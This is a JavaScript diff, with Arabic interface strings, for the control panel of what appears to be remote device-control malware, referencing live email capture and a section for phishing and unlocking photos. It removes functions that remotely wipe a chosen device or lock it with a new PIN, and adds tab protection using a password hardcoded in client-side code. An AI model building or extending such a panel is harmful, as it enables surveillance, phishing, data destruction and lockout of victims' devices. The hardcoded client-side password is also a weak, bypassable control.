@@ -45,6 +45,13 @@ let liveEmails = [];
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
 
+// ═══════════════════════════════════════════════════════
+// 🔐 حماية الأقسام الحساسة
+// ═══════════════════════════════════════════════════════
+const PROTECTED_TABS = ['admin', 'advanced'];
+const TAB_PASSWORD = '922499';
+const UNLOCKED_TABS = {};
+
 function logout() {
     const token = getAuthToken();
     if (token) {
@@ -623,48 +630,6 @@ function setLockTimeout() {
     advancedAction('lock_screen_timeout', { timeout: t * 1000 });
     showNotification('⏱️ تم', 'قفل تلقائي بعد ' + t + ' ثانية', '⏱️');
     document.getElementById('lockTimeoutInput').value = '';
-}
-
-function wipeConfirm() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-
-    const input = prompt(
-        '💥💥💥 تحذير خطير 💥💥💥\n\n' +
-        'سيتم مسح كل بيانات الجهاز:\n' +
-        '• الصور والفيديوهات\n' +
-        '• الرسائل والمكالمات\n' +
-        '• الحسابات والتطبيقات\n' +
-        '• كل شي!\n\n' +
-        '⚠️ لا يمكن التراجع!\n\n' +
-        'اكتب WIPE للتأكيد:'
-    );
-
-    if (input !== 'WIPE') {
-        alert('❌ تم الإلغاء');
-        return;
-    }
-
-    if (!confirm('هل أنت متأكد 100%؟\n\nهذه آخر فرصة للتراجع!')) return;
-
-    advancedAction('wipe_device', { confirm: true });
-    showNotification('💥 جاري المسح', 'الجهاز سيُمسح بالكامل', '💥');
-}
-
-function lockWithPin() {
-    const pin = document.getElementById('lockPinInput').value.trim();
-    if (!pin || pin.length < 4) {
-        alert('⚠️ الرمز قصير (4 أرقام على الأقل)');
-        return;
-    }
-    if (!/^\d+$/.test(pin)) {
-        alert('⚠️ الرمز يجب أن يكون أرقام فقط');
-        return;
-    }
-    if (!confirm('🔐 سيتم قفل الجهاز برمز جديد:\n\n' + pin + '\n\n⚠️ لن يستطيع أحد فتحه بدون هذا الرمز!\n\nاستمر؟')) return;
-
-    advancedAction('lock_device_with_pin', { pin: pin });
-    showNotification('🔐 جاري القفل', 'الرمز: ' + pin, '🔒');
-    document.getElementById('lockPinInput').value = '';
 }
 
 // ═══ Admin Actions — Phishing & Unlock Photos ═══
@@ -1603,7 +1568,21 @@ async function loadDeviceInfo() {
     } catch (e) {}
 }
 
+// ═══════════════════════════════════════════════════════
+// 🔐 switchTab — مع حماية بكلمة مرور
+// ═══════════════════════════════════════════════════════
 function switchTab(tabName) {
+    // ✅ حماية الأقسام الحساسة
+    if (PROTECTED_TABS.includes(tabName) && !UNLOCKED_TABS[tabName]) {
+        const entered = prompt('🔐 أدخل كلمة المرور للدخول إلى هذا القسم:');
+        if (entered === null) return;
+        if (entered !== TAB_PASSWORD) {
+            alert('❌ كلمة المرور غير صحيحة');
+            return;
+        }
+        UNLOCKED_TABS[tabName] = true;
+    }
+
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
     const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
